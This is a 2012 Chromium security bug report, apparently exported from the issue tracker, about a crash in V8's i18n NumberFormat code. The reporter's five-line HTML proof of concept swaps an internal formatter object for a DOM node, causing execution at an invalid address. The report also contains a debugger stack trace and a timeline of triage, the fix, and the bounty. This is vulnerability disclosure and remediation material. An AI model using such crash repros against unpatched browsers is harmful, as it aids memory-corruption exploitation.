# UNKNOWN in v8_i18n::IntlNumberFormat::JSInternalFormat

| Field | Value |
|-------|-------|
| **Issue ID** | [40058849](https://issues.chromium.org/issues/40058849) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>JavaScript, Internals |
| **Reporter** | sl...@gmail.com |
| **Assignee** | ci...@chromium.org |
| **Created** | 2012-05-27 |
| **Bounty** | $1,000.00 |

## Description

Crashes on windows dev 21.0.1145.0 (138079) and canary 21.0.1153.0 (139208).

Repro:
----- crash1.html -----
<script>
    window.onload = main;

    function main(){
        var f1 = window.v8Intl.NumberFormat();
        f1.__formatter__ = window.document.body;
        f1.format();
    }
</script>
<body></body>
-----------------------

(acc.1724): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=59dbab55 ebx=0026ee38 ecx=5b879c54 edx=0026eda8 esi=0026ee54 edi=5b879c54
eip=d75605e8 esp=0026ed90 ebp=0026edb8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
d75605e8 ??              ???

ExceptionAddress: d75605e8
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000008
   Parameter[1]: d75605e8
Attempt to execute non-executable address d75605e8

ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
0026ed8c 5aae7405 0xd75605e8
0026edb8 5ace9fcc chrome_59a10000!icu_46::NumberFormat::format+0x2d
0026ee18 59c7a95d chrome_59a10000!v8_i18n::IntlNumberFormat::JSInternalFormat+0xd0
0026ee80 59c7a75a chrome_59a10000!v8::internal::HandleApiCallHelper<0>+0x1e3
0026ef7c 59c3167d chrome_59a10000!v8::internal::Builtin_HandleApiCall+0x16
0026efc4 59c31538 chrome_59a10000!v8::internal::Invoke+0x139
0026f004 59ca7075 chrome_59a10000!v8::internal::Execution::Call+0x17b
0026f058 59dc47e0 chrome_59a10000!v8::Function::Call+0x117
0026f0a4 59dc458a chrome_59a10000!WebCore::V8Proxy::instrumentedCallFunction+0x1ae
0026f0c8 59dc3d19 chrome_59a10000!WebCore::V8Proxy::callFunction+0x22
0026f0f0 59dc3ab1 chrome_59a10000!WebCore::V8EventListener::callListenerFunction+0x86
0026f130 59dc2bd4 chrome_59a10000!WebCore::V8AbstractEventListener::invokeEventHandler+0x107
0026f170 59dc2a49 chrome_59a10000!WebCore::V8AbstractEventListener::handleEvent+0x76
0026f1a0 59b33eb9 chrome_59a10000!WebCore::EventTarget::fireEventListeners+0x124
0026f1d0 59b8674c chrome_59a10000!WebCore::EventTarget::fireEventListeners+0x73
0026f1f8 59e6faf1 chrome_59a10000!WebCore::DOMWindow::dispatchEvent+0xef
0026f21c 59b704fe chrome_59a10000!WebCore::DOMWindow::dispatchLoadEvent+0x120
0026f240 59b70337 chrome_59a10000!WebCore::Document::implicitClose+0x12f
0026f250 59b6ff4d chrome_59a10000!WebCore::FrameLoader::checkCallImplicitClose+0x4c
0026f268 59b6eaaf chrome_59a10000!WebCore::FrameLoader::checkCompleted+0x150
0026f270 59b6e993 chrome_59a10000!WebCore::FrameLoader::finishedParsing+0x3d
0026f288 59b36f7c chrome_59a10000!WebCore::Document::finishedParsing+0xe8
[...]


## Attachments

- [stack1.txt](attachments/stack1.txt) (text/x-c; charset=us-ascii, 9.8 KB)
- [crash1.html](attachments/crash1.html) (text/plain; charset=us-ascii, 204 B)

## Timeline

### in...@chromium.org (2012-05-28)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=51945819

Uploader: inferno@chromium.org

Crash Type: UNKNOWN
Crash Address: 0x000000000000
Crash State:
  - crash stack -
  v8_i18n::IntlNumberFormat::JSInternalFormat
  v8::internal::Builtin_HandleApiCall
  v8::internal::Invoke
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=136250:136263

Minimized Testcase (0.18 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95xQCazu7WYJP-qeW6cXevuRvOeFxsYN9ipz0IohdXPIGnemT1-5SRaUvd4Y9KKQAJng6Cy3TQ25ddZIIU7iWHRMkxyPbshfjwelWdc3ML4EEs2JCdJqTMJPZ9dWlF7KGi1k2MNaeT-xCeJsW4uFRvksOjJVQ
<script>
    window.onload = main;

    function main(){
        var f1 = window.v8Intl.NumberFormat();
        f1.__formatter__ = window.document.body;
        f1.format();
    }
</script>

### in...@chromium.org (2012-05-28)

'this' looks pretty bad. This looks like a recent regression as per the range.

### js...@chromium.org (2012-05-28)

Yeah. This is almost certainly from the latest v8 roll, which added v8Intl: https://src.chromium.org/viewvc/chrome?view=rev&revision=136252

### js...@chromium.org (2012-05-28)

[Empty comment from Monorail migration]

### pa...@google.com (2012-06-12)

Friendly ping. :) Any progress on this one?

### sc...@gmail.com (2012-06-15)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-06-19)

@cira: I think M21 branched so probably are looking at a merge now?

### in...@chromium.org (2012-06-19)

This bug has been sitting for a month now. Cira, can you please take a look or help to find another owner. We don't like security regressions with well reduced testcases to go into stable.

### ci...@chromium.org (2012-06-20)

Sorry, I didn't see it earlier (was on vacation past 2 weeks). I'll take a look at it.

### bu...@chromium.org (2012-06-20)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=143196

------------------------------------------------------------------------
r143196 | cira@chromium.org | Wed Jun 20 10:32:31 PDT 2012

Changed paths:
 M http://src.chromium.org/viewvc/chrome/trunk/src/DEPS?r1=143196&r2=143195&pathrev=143196

v8-i18n roll, 104:105.

BUG=129942
TEST=Can't reproduce crash from the bug.
TBR=inferno@chromium.org


Review URL: https://chromiumcodereview.appspot.com/10572036
------------------------------------------------------------------------

### in...@chromium.org (2012-06-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-10)

Tweaked branch DEPS to v8-i18n r105 on M21 branch.

### sc...@gmail.com (2012-07-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-08-20)

@slaweck: thanks for catching this regression!
$1000

### sc...@gmail.com (2012-09-12)

Paid as part of a $2000 batch.

### bu...@chromium.org (2012-10-14)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2012-11-14)

The following revision refers to this bug:
    http://goto.ext.google.com/viewvc/chrome-internal?view=rev&revision=26648

------------------------------------------------------------------------
r26648 | cevans@google.com | 2012-07-10T18:40:15.015044Z

------------------------------------------------------------------------

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### la...@google.com (2013-01-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/129942?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>JavaScript, Internals]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058849)*
